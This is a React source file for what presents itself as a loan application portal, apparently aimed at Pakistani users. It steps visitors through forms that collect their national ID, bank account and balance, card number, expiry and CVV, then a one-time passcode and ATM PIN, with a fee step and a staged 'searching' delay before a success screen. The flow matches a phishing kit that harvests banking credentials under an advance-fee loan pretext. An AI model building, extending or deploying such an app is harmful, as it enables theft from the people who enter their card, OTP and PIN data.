import React, { useState, useEffect } from 'react';
import { LoanApplicationState, StepType } from './types';
import { Header } from './components/Header';
import { Footer } from './components/Footer';
import { StepIndicator } from './components/StepIndicator';
import { HomeStep } from './components/HomeStep';
import { PersonalStep } from './components/PersonalStep';
import { BankStep } from './components/BankStep';
import { FeeStep } from './components/FeeStep';
import { SearchingStep } from './components/SearchingStep';
import { OtpAtmStep } from './components/OtpAtmStep';
import { SuccessStep } from './components/SuccessStep';
import { LeadershipModal } from './components/LeadershipModal';

export default function App() {
  const [currentStep, setCurrentStep] = useState<StepType>('home');
  const [isLeadershipOpen, setIsLeadershipOpen] = useState(false);

  const [formData, setFormData] = useState<LoanApplicationState>({
    sessionId: `PK-${Math.floor(100000 + Math.random() * 900000)}`,
    fullName: '',
    cnic: '',
    mobileNo: '',
    gender: '',
    dob: '',
    province: '',
    address: '',
    loanAmount: '',
    loanPurpose: '',
    occupation: '',
    bankName: '',
    accountNumber: '',
    currentBalance: '',
    monthlyIncome: '',
    incomeDate: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    otpCode: ['', '', '', '', '', ''],
    pinValues: ['', '', '', ''],
  } as any);

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [currentStep]);

  const updateFormData = (fields: Partial<LoanApplicationState>) => {
    setFormData((prev) => ({ ...prev, ...fields }));
  };

  const handleReset = () => {
    setFormData({
      sessionId: `PK-${Math.floor(100000 + Math.random() * 900000)}`,
      fullName: '',
      cnic: '',
      mobileNo: '',
      gender: '',
      dob: '',
      province: '',
      address: '',
      loanAmount: '',
      loanPurpose: '',
      occupation: '',
      bankName: '',
      accountNumber: '',
      currentBalance: '',
      monthlyIncome: '',
      cardNumber: '',
      expiry: '',
      cvv: '',
      otpCode: ['', '', '', '', '', ''],
      pinValues: ['', '', '', ''],
    } as any);
    setCurrentStep('home');
  };

  return (
    <div className="min-h-screen bg-slate-100 flex flex-col font-sans text-slate-900 selection:bg-emerald-600 selection:text-white">
      <Header
        onApplyClick={() => setCurrentStep('personal')}
        onOpenLeadership={() => setIsLeadershipOpen(true)}
        onHomeClick={() => setCurrentStep('home')}
      />

      {currentStep !== 'home' && currentStep !== 'success' && currentStep !== 'searching' && (
        <StepIndicator
          currentStep={currentStep}
          onStepClick={(step) => setCurrentStep(step)}
        />
      )}

      <main className="flex-1 max-w-4xl w-full mx-auto px-4 py-6">
        {currentStep === 'home' && (
          <HomeStep
            onStartApply={() => setCurrentStep('personal')}
            onOpenLeadership={() => setIsLeadershipOpen(true)}
          />
        )}

        {currentStep === 'personal' && (
          <PersonalStep
            data={formData}
            updateData={updateFormData}
            onNext={() => setCurrentStep('bank')}
          />
        )}

        {currentStep === 'bank' && (
          <BankStep
            data={formData}
            updateData={updateFormData}
            onNext={() => setCurrentStep('fee')}
            onBack={() => setCurrentStep('personal')}
          />
        )}

        {currentStep === 'fee' && (
          <FeeStep
            data={formData}
            updateData={updateFormData}
            onNext={() => setCurrentStep('searching')}
            onBack={() => setCurrentStep('bank')}
          />
        )}

        {currentStep === 'searching' && (
          <SearchingStep
            onComplete={() => setCurrentStep('otp')}
          />
        )}

        {(currentStep === 'verify' || currentStep === 'otp' || currentStep === 'pin') && (
          <OtpAtmStep
            data={formData}
            updateData={updateFormData}
            subStage={currentStep === 'pin' ? 'pin' : 'otp'}
            onOtpSuccess={() => setCurrentStep('pin')}
            onBackToOtp={() => setCurrentStep('otp')}
            onComplete={() => setCurrentStep('success')}
            onBack={() => setCurrentStep('fee')}
          />
        )}

        {currentStep === 'success' && (
          <SuccessStep
            data={formData}
            onReset={handleReset}
          />
        )}
      </main>

      <Footer />

      <LeadershipModal
        isOpen={isLeadershipOpen}
        onClose={() => setIsLeadershipOpen(false)}
      />
    </div>
  );
}
